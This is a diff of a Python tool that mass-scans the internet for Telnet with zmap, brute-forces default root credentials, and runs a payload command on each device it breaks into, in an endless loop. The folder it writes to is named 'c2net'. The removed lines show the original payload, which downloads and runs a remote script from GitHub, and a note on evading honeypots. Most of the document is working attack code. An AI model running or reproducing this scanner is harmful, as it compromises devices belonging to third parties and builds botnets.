@@ -1,19 +1,17 @@
-import os
+import subprocess
 import sys
+import os
 import threading
-import telnet
+import socket
 import concurrent.futures
+import time
 
 VERSION = "1.0"
-
-IP_FILE = "source.txt"
+FOLDER_NAME = "c2net"
+IP_OUTPUT_FILE = "source.txt"
 VALID_FILE = "valid.txt"
 INVALID_FILE = "invalid.txt"
 COMMAND_OUTPUT_FILE = "cmd.txt"
-
-# TODO:
-# To skip honey ports kill ips that have multiple ports open with diff credentials
-# You can also set a mimick payload and check your infra (if they are attempting a ddos) < make sure your payload is connected to venv that can read traffic on your infra (reject packets but still read the output < make sure you open a random port - and use a secondary vps to host your mimick payload to fw honeypots)
 
 CREDENTIALS = [
     ("root", "root"),
@@ -26,41 +24,82 @@ CREDENTIALS = [
     ("root", "86981198"),
 ]
 
-TELNET_TIMEOUT = 0.1
-MAX_WORKERS = 10
-PAYLOAD = "cd ~ && clear && rm -rf payload && pip3 install cloudscraper && mkdir payload && cd payload && wget https://github.com/Jaxploit/payload/raw/refs/heads/main/main.py && python3 main.py"
+TELNET_TIMEOUT = 0.05
+MAX_WORKERS = 50
+PAYLOAD = "echo Works"
+SCAN_DURATION = 300
 
+class TelnetClient:
+    def __init__(self, host, port=23, timeout=TELNET_TIMEOUT):
+        self.host = host
+        self.port = port
+        self.timeout = timeout
+        self.sock = None
+
+    def connect(self):
+        self.sock = socket.create_connection((self.host, self.port), self.timeout)
+        return self.read_until(b"\n")
+
+    def write(self, data: bytes):
+        if self.sock:
+            self.sock.sendall(data)
+            return self.read_until(b"\n")
+        return None
+
+    def read_until(self, expected, bufsize=4096):
+        data = b""
+        self.sock.settimeout(self.timeout)
+        while not data.endswith(expected):
+            try:
+                chunk = self.sock.recv(bufsize)
+                if not chunk:
+                    break
+                data += chunk
+            except socket.timeout:
+                break
+        return data
+
+    def close(self):
+        if self.sock:
+            self.sock.close()
+            self.sock = None
+
+    def __enter__(self):
+        self.connect()
+        return self
+
+    def __exit__(self, *a):
+        self.close()
+
+def scan_telnet(output: str):
+    cmd = ["zmap", "-p23", "-o", output, "-r", "10000"]
+    process = subprocess.Popen(cmd)
+    time.sleep(SCAN_DURATION)
+    process.terminate()
 
 def read_hosts(folder_name):
     try:
-        file = open(os.path.join(folder_name, IP_FILE), "r")
+        file = open(os.path.join(folder_name, IP_OUTPUT_FILE), "r")
         return (x.strip() for x in file if x.strip()), file
     except FileNotFoundError:
-        print(f"Error: folder {folder_name} not found!!")
         return [], None
 
-
-def execute_command(tn: telnet.TelnetClient, command: str):
+def execute_command(tn: TelnetClient, command: str):
     tn.write(command.encode("ascii") + b"\n")
-    response = tn.read_until(b"$")
-    return response.decode(errors="ignore").strip()
-
+    return tn.read_until(b"$").decode(errors="ignore").strip()
 
 def try_login(host: str, username: str, password: str):
     try:
-        with telnet.TelnetClient(host, 23, TELNET_TIMEOUT) as tn:
+        with TelnetClient(host) as tn:
             tn.read_until(b"login: ")
             tn.write(username.encode("ascii") + b"\n")
             tn.read_until(b"Password: ")
             tn.write(password.encode("ascii") + b"\n")
-
             response = tn.read_until(b"$")
             if b"$" in response or b"#" in response:
-                print(f"[+] VALID: {host} | {username}:{password}")
                 command_output = execute_command(tn, PAYLOAD)
-                print(f"[COMMAND OUTPUT] {host}:\n{command_output}")
                 return (
-                    f"{host} {username} {password}\n",
+                    f"{host}:{username}:{password}\n",
                     f"{host}:\n{command_output}\n\n",
                     None,
                 )
@@ -68,15 +107,12 @@ def try_login(host: str, username: str, password: str):
         pass
     return None, None, f"{host}\n"
 
-
 def scan_host(host):
     global lock, number, valids, invalids, done
     with lock:
         number += 1
     for username, password in CREDENTIALS:
-        login_result, command_result, invalid_result = try_login(
-            host, username, password
-        )
+        login_result, command_result, invalid_result = try_login(host, username, password)
         if login_result:
             with lock:
                 valids += 1
@@ -87,71 +123,44 @@ def scan_host(host):
         done += 1
     return None, None, invalid_result
 
+def loading_bar(progress, total):
+    percent = int((progress / total) * 100)
+    return f"[{percent}%]"
 
-def loading_bar(progress, total, length=30):
-    percent = progress / total
-    filled = int(length * percent)
-    bar = "#" * filled + "-" * (length - filled)
-    return f"[{bar}] {int(percent * 100)}%"
-
-
-def main(argv: list) -> int:
-    if len(argv) < 2 or "-h" in argv:
-        print(
-            """Usage: %s %s <folder_name> [-c] [-v] [-i]
-
-            This utility script brute-force all IPs in the "folder_name" folder.
-            Arguments:
-                "folder_name" -> Required, the folder that contain the IPs and will contain saved IPs.
-                "-c" -> Optional, Log payload command output.
-                "-v" -> Optional, Do not Log valid logins (Strange but ok).
-                "-i" -> Optional, Log Invalid logins.
-
-                "-h" -> Print this message
-            
-            %s - by dalas_16, improved by _hackerbob_
-            Version {VERSION}
-            
-            """
-            % (sys.executable, sys.argv[0])
-        )
-        return 1
-    else:
-        folder_name = argv[1]
-        log_commands = "-c" in argv
-        log_valids = "-v" not in argv
-        log_invalids = "-i" in argv
-
-    hosts, file = read_hosts(folder_name)
-    if not hosts:
-        print("No hosts found.")
-        return 1
-    print("Starting bruteforce")
+def brute_force():
     global lock, number, valids, invalids, done
     number = 0
     done = 0
     valids = invalids = 0
     lock = threading.Lock()
+    hosts, file = read_hosts(FOLDER_NAME)
+    if not hosts:
+        return
     with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
         results = executor.map(scan_host, hosts)
-        with open(os.path.join(folder_name, VALID_FILE), "w") as valid_file:
-            with open(os.path.join(folder_name, COMMAND_OUTPUT_FILE), "w") as cmd_file:
-                with open(os.path.join(folder_name, INVALID_FILE), "w") as invalid_file:
+        with open(os.path.join(FOLDER_NAME, VALID_FILE), "w") as valid_file:
+            with open(os.path.join(FOLDER_NAME, COMMAND_OUTPUT_FILE), "w") as cmd_file:
+                with open(os.path.join(FOLDER_NAME, INVALID_FILE), "w") as invalid_file:
                     for login_result, command_result, invalid_result in results:
-                        print(
-                            f"\rStatus: {done} / {number}, {valids=} {invalids=} {loading_bar(done,number)}",
-                            end="",
-                        )
-                        if log_valids and login_result:
+                        print(f"\r{done}/{number} {loading_bar(done, number)}", end="")
+                        if login_result:
                             valid_file.write(login_result)
-                        if log_commands and command_result:
+                        if command_result:
                             cmd_file.write(command_result)
-                        if log_invalids and invalid_result:
+                        if invalid_result:
                             invalid_file.write(invalid_result)
-    print("\nBruted all IPs. Valid: %s Invalid: %s" % (valids, invalids))
-    file.close()
-    return 0
+    if file:
+        file.close()
 
+def main():
+    os.makedirs(FOLDER_NAME, exist_ok=True)
+    path = os.path.join(FOLDER_NAME, IP_OUTPUT_FILE)
+    while True:
+        scan_telnet(path)
+        brute_force()
+        with open(path, "w") as f:
+            f.write("")
+        time.sleep(1)
 
 if __name__ == "__main__":
-    sys.exit(main(sys.argv))
+    main()
